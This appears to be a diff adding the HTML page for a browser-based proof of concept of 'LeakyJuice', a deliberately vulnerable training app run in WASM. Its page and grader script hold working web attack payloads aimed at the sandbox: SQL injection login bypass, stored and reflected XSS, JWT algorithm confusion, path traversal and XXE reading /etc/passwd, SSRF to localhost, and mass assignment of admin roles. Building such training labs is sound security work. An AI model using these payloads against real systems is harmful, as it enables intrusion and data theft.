@@ -1,0 +1,86 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>LeakyJuice — client-side (WASM) POC</title>
+<style>
+  :root{--peach:#ffe9cc;--cream:#fff7ee;--ink:#2b2018;--sub:#7a6a58;--orange:#ff7a1a;--orange-d:#e8600a;--line:#f0dcc4;--leaf:#3aa76d;--bad:#d64545}
+  *{box-sizing:border-box} body{margin:0;background:var(--peach);color:var(--ink);font-family:'Baloo 2',ui-rounded,system-ui,sans-serif}
+  .wrap{max-width:900px;margin:0 auto;padding:24px 20px}
+  h1{font-size:clamp(32px,5vw,52px);letter-spacing:-.02em;margin:.2em 0}
+  .tag{display:inline-block;background:#fff1df;border-radius:999px;padding:4px 12px;font-size:12px;font-weight:700;color:var(--orange-d)}
+  .panel{background:#fff;border:1px solid var(--line);border-radius:18px;padding:20px;box-shadow:0 8px 30px rgba(120,70,10,.10);margin:16px 0}
+  code{background:#fff1df;padding:2px 6px;border-radius:6px;font-family:ui-monospace,Menlo,monospace;font-size:.9em}
+  .muted{color:var(--sub)} .row{display:flex;gap:8px;align-items:center;padding:5px 0;border-bottom:1px solid var(--line);font-size:14px}
+  .ok{color:var(--leaf);font-weight:700} .no{color:var(--bad);font-weight:700}
+  .score{font-size:40px;font-weight:800;letter-spacing:-.02em}
+  .btn{background:var(--orange);color:#fff;border:0;border-radius:999px;padding:10px 18px;font:700 15px inherit;cursor:pointer}
+  .btn:hover{background:var(--orange-d)} input{padding:9px 12px;border:1px solid var(--line);border-radius:10px;font:inherit;background:var(--cream)}
+  pre{background:#0e1116;color:#c8d3e0;padding:12px;border-radius:10px;overflow:auto;font-size:12px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <span class="tag">CLIENT-SIDE · WASM · nothing phones home</span>
+  <h1>LeakyJuice 🧃 — in your browser</h1>
+  <p class="muted">The whole vulnerable "server" runs in this tab: <b>SQLite compiled to WASM</b> (real SQLi),
+  <b>WebCrypto</b> (real JWT + algorithm confusion), and a <b>virtual filesystem + loopback</b>
+  (SSRF / traversal / XXE that can't touch anything real). No backend. Each visitor gets their own sandbox.</p>
+
+  <div class="panel">
+    <h2 style="margin:0 0 4px">Self-check <span class="muted" style="font-size:14px">— the ported challenges, graded in-browser</span></h2>
+    <div id="status" class="muted">booting SQLite-WASM…</div>
+    <div class="score" id="score"></div>
+    <div id="results"></div>
+  </div>
+
+  <div class="panel">
+    <h3 style="margin:0 0 10px">Try it live — SQL injection login bypass</h3>
+    <p class="muted" style="font-size:14px">The email box goes straight into the SQL. Log in as admin with no password:</p>
+    <div style="display:flex;gap:8px;flex-wrap:wrap">
+      <input id="email" size="34" value="admin@leakyjuice.com' -- ">
+      <input id="pass" placeholder="password (ignored)" value="x">
+      <button class="btn" onclick="tryLogin()">Login</button>
+    </div>
+    <pre id="loginOut" style="margin-top:12px">// response appears here</pre>
+  </div>
+  <p class="muted" style="font-size:13px">POC scope: 12 challenges across all three platform swaps. The full port targets 88/88 parity with the Node build.</p>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/sql.js/1.10.3/sql-wasm.js"></script>
+<script src="engine.js"></script>
+<script>
+const hasFlag = (res, f) => JSON.stringify(res.body).includes(f);
+async function tryLogin(){
+  const r = await LJ.dispatch('POST','/api/login',{},{email:document.getElementById('email').value,password:document.getElementById('pass').value});
+  document.getElementById('loginOut').textContent = JSON.stringify(r.body,null,2);
+}
+async function runGrader(){
+  const F = LJ.FLAGS, checks = [];
+  const add = (name, pass) => checks.push({name, pass});
+  add('sqli_login', hasFlag(await LJ.dispatch('POST','/api/login',{},{email:"admin@leakyjuice.com' -- ",password:'x'}), F.sqli_login));
+  add('idor_profile', hasFlag(await LJ.dispatch('GET','/api/users/4'), F.idor_profile));
+  add('secrets_config', hasFlag(await LJ.dispatch('GET','/api/config'), F.secrets_config));
+  const login = await LJ.dispatch('POST','/api/login',{},{email:'mira@leakyjuice.com',password:'sunshine-42'});
+  add('excessive_data', hasFlag(await LJ.dispatch('GET','/api/me',{},{},{authorization:'Bearer '+login.body.token}), F.excessive_data));
+  add('mass_assign', hasFlag(await LJ.dispatch('POST','/api/signup',{},{email:'h@x.com',password:'x',name:'H',role:'admin',is_admin:1}), F.mass_assign));
+  add('bola_orders', hasFlag(await LJ.dispatch('GET','/api/v2/orders/40902'), F.bola_orders));
+  add('reflected_xss', hasFlag(await LJ.dispatch('GET','/search',{q:'<img src=x onerror=1>'}), F.reflected_xss));
+  await LJ.dispatch('POST','/api/products/1/reviews',{},{author:'h4x',body:'<img src=x onerror=alert(1)>'});
+  add('stored_xss', hasFlag(await LJ.dispatch('GET','/product/1'), F.stored_xss));
+  const forged = await LJ.forgeAdmin();
+  add('jwt_alg_confusion', hasFlag(await LJ.dispatch('GET','/api/session',{},{},{authorization:'Bearer '+forged}), F.jwt_confusion));
+  add('path_traversal', hasFlag(await LJ.dispatch('GET','/api/receipt',{file:'../../etc/passwd'}), F.path_traversal));
+  add('xxe_file_read', hasFlag(await LJ.dispatch('POST','/api/import/xml',{},{xml:'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'}), F.composer_xxe));
+  add('ssrf_internal', hasFlag(await LJ.dispatch('POST','/api/import-avatar',{},{url:'http://localhost/internal/metadata'}), F.ssrf));
+
+  const passed = checks.filter(c=>c.pass).length;
+  document.getElementById('status').textContent = 'engine ready — SQLite-WASM + WebCrypto live in this tab.';
+  document.getElementById('score').innerHTML = `${passed}/${checks.length} <span class="muted" style="font-size:16px">challenges green in-browser</span>`;
+  document.getElementById('results').innerHTML = checks.map(c=>`<div class="row"><span class="${c.pass?'ok':'no'}">${c.pass?'✅':'❌'}</span> ${c.name}</div>`).join('');
+}
+LJ.ready.then(runGrader).catch(e=>{ document.getElementById('status').innerHTML = '<span class="no">boot failed: '+e.message+'</span>'; });
+</script>
+</body>
+</html>
